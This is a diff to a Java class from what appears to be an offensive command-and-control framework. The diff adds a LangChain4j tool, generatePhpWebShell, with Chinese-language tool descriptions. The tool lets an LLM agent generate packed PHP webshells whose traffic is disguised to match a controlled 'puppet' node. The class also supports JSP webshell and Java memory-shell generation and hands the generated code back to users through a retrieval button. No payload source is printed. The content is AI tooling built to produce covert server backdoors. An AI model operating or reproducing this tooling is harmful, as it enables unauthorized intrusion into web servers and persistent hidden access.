@@ -8,6 +8,9 @@ import dev.langchain4j.model.chat.response.ChatResponse;
 import org.leo.ai.channel.DelegatingChatModel;
 import org.leo.core.entity.Disguise;
 import org.leo.core.entity.Puppet;
+import org.leo.core.generator.GeneratedArtifact;
+import org.leo.core.generator.GenerationRequest;
+import org.leo.core.runtime.PuppetRuntime;
 import org.leo.jmg.ServerInjectorMapper;
 import org.leo.jmg.ShellGenerator;
 import org.leo.jmg.ShellGeneratorConfig;
@@ -18,12 +21,14 @@ import org.leo.jmg.mem.packer.Util;
 import org.leo.jmg.mem.packer.jsp.JspObfuscationPipeline;
 import org.leo.service.PuppetService;
 import org.leo.service.disguise.DisguiseService;
+import org.leo.service.generator.ScriptGeneratorService;
 import org.leo.service.shell.ShellResultStore;
 import org.springframework.stereotype.Component;
 
 import java.util.Arrays;
 import java.util.LinkedHashMap;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 
 /**
@@ -74,22 +79,25 @@ public class ShellGeneratorTools {
     private final DelegatingChatModel chatModel;
     private final ShellResultStore resultStore;
     private final PuppetService puppetService;
+    private final ScriptGeneratorService scriptGeneratorService;
 
     public ShellGeneratorTools(DisguiseService disguiseService,
                                DelegatingChatModel chatModel,
                                ShellResultStore resultStore,
-                               PuppetService puppetService) {
+                               PuppetService puppetService,
+                               ScriptGeneratorService scriptGeneratorService) {
         this.disguiseService = disguiseService;
         this.chatModel = chatModel;
         this.resultStore = resultStore;
         this.puppetService = puppetService;
+        this.scriptGeneratorService = scriptGeneratorService;
     }
 
     // ── 元数据查询 ──────────────────────────────────────────────────────────────
 
-    @Tool("获取脚本生成器元数据：所有支持的服务器类型（serverType）、注入器形态（shellType）、" +
-          "打包器类型（packerType）及分组层级、目标能力要求、Servlet 命名空间、各 Packer 支持的混淆步骤 ID，以及全量 JSP 混淆步骤描述列表。" +
-          "生成 WebShell 或内存马前，调用此工具确认合法参数范围。")
+    @Tool("获取 Shell 生成器元数据：Java 服务器类型、注入器形态、Packer、Servlet 命名空间、JSP 混淆步骤，" +
+          "以及 PHP 等运行时生成器支持的 artifactTypes、协议、最低版本、输出模式和运行要求。" +
+          "生成 WebShell 或内存马前调用此工具确认合法参数范围，不要凭记忆猜测。")
     public Map<String, Object> getShellGeneratorMeta() {
         Map<String, Object> data = new LinkedHashMap<>();
         data.put("serverInjectorTypes", ServerInjectorMapper.getAllServerInjectorMapAsString());
@@ -100,11 +108,12 @@ public class ShellGeneratorTools {
         data.put("targetJavaVersions", targetJavaVersions());
         data.put("servletNamespaces", ServerInjectorMapper.getSupportedServletNamespaces());
         data.put("obfuscationSteps", JspObfuscationPipeline.getStepDescriptors());
+        data.put("runtimeGenerators", scriptGeneratorService.getMetadata());
         return data;
     }
 
     @Tool("根据 puppetId 查询该 Puppet 当前使用的通信协议和伪装器配置，" +
-          "返回 protocol、reqDisguiseId、reqDisguiseName、respDisguiseId、respDisguiseName。" +
+          "返回 runtime、protocol、reqDisguiseId、reqDisguiseName、respDisguiseId、respDisguiseName。" +
           "生成 WebShell 或内存马前必须调用此工具，确保生成的 shell 与当前傀儡节点通信协议完全匹配，" +
           "避免因协议或伪装器不匹配导致 shell 无法使用。" +
           "如果用户未明确指定 puppetId，请先通过 getAllPuppet 工具获取可用节点列表后再调用本工具。")
@@ -117,6 +126,8 @@ public class ShellGeneratorTools {
         result.put("success",       true);
         result.put("puppetId",      puppet.getPuppetId());
         result.put("puppetName",    puppet.getPuppetName());
+        result.put("runtime",       isBlank(puppet.getType())
+                ? "java" : puppet.getType().trim().toLowerCase(Locale.ROOT));
         result.put("protocol",      puppet.getProtocol() != null ? puppet.getProtocol() : "http");
         result.put("reqDisguiseId", puppet.getReqDisguiseId());
         result.put("respDisguiseId", puppet.getRespDisguiseId());
@@ -131,8 +142,67 @@ public class ShellGeneratorTools {
             result.put("respDisguiseName", resp != null ? resp.getDisguiseName() : "unknown");
         }
 
-        result.put("tip", "请将 protocol、reqDisguiseId、respDisguiseId 直接传入 generateWebShell 或 generateMemoryShell，" +
-                "确保生成的 shell 与该傀儡节点通信协议完全一致。");
+        result.put("tip", "请根据 runtime 选择生成工具：php 使用 generatePhpWebShell，" +
+                "java 使用 generateWebShell 或 generateMemoryShell；原样传入 protocol、reqDisguiseId、respDisguiseId。");
+        return result;
+    }
+
+    // ── PHP WebShell 生成 ─────────────────────────────────────────────────────
+
+    @Tool("生成 PHP WebShell，并将完整代码存入缓存后返回 resultId。" +
+          "调用前必须先用 getPuppetShellConfig 确认目标 runtime=php、protocol=http，并原样传入伪装器 ID。" +
+          "outputMode 从 getShellGeneratorMeta 的 runtimeGenerators.php.outputModes 中选择：" +
+          "compact 为默认精简源码，packed 需要 zlib/base64_decode/gzinflate，portable 为便于兼容排障的展开源码。" +
+          "headerName 与 headerValue 必须同时设置或同时留空；respCode 默认 200；seed 留空时自动随机。" +
+          "PHP 当前只支持 webshell，不支持 Java 内存马参数和 JSP 模板变异。")
+    public Map<String, Object> generatePhpWebShell(
+            String reqDisguiseId,
+            String respDisguiseId,
+            String protocol,
+            String outputMode,
+            String headerName,
+            String headerValue,
+            Integer respCode,
+            String seed) throws Exception {
+        Disguise reqDisguise = requireDisguise(reqDisguiseId, "reqDisguiseId");
+        Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
+
+        String effectiveProtocol = isBlank(protocol) ? "http" : protocol.trim().toLowerCase(Locale.ROOT);
+        if (!"http".equals(effectiveProtocol)) {
+            throw new IllegalArgumentException("PHP WebShell 当前仅支持 http 协议，当前值: " + protocol);
+        }
+        if (isBlank(headerName) != isBlank(headerValue)) {
+            throw new IllegalArgumentException("headerName 与 headerValue 必须同时设置或同时留空");
+        }
+
+        Map<String, Object> options = new LinkedHashMap<>();
+        if (!isBlank(outputMode)) options.put("outputMode", outputMode.trim().toLowerCase(Locale.ROOT));
+        if (!isBlank(headerName)) {
+            options.put("headerName", headerName.trim());
+            options.put("headerValue", headerValue.trim());
+        }
+        if (respCode != null) options.put("respCode", respCode);
+        if (!isBlank(seed)) options.put("seed", seed.trim());
+
+        GeneratedArtifact artifact = scriptGeneratorService.generate(new GenerationRequest(
+                PuppetRuntime.PHP, "webshell", reqDisguise, respDisguise, options));
+
+        Map<String, Object> meta = new LinkedHashMap<>(artifact.getMetadata());
+        meta.put("fileExtension", artifact.getFileExtension());
+        meta.put("mediaType", artifact.getMediaType());
+        meta.put("warnings", artifact.getWarnings());
+        meta.put("lines", artifact.getContent().split("\n").length);
+        meta.put("chars", artifact.getContent().length());
+
+        String resultId = resultStore.put(artifact.getContent(), meta);
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("success", true);
+        result.put("resultId", resultId);
+        result.put("fetchUrl", "/platform/shell-generator/result/" + resultId);
+        result.put("meta", meta);
+        result.put("tip", "完整代码已缓存（30 分钟有效）。" +
+                "请在回复正文中嵌入以下按钮语法，让用户可以直接在对话中取回代码：" +
+                "[[shell-result:" + resultId + ":取回 PHP WebShell 代码]]");
         return result;
     }
 
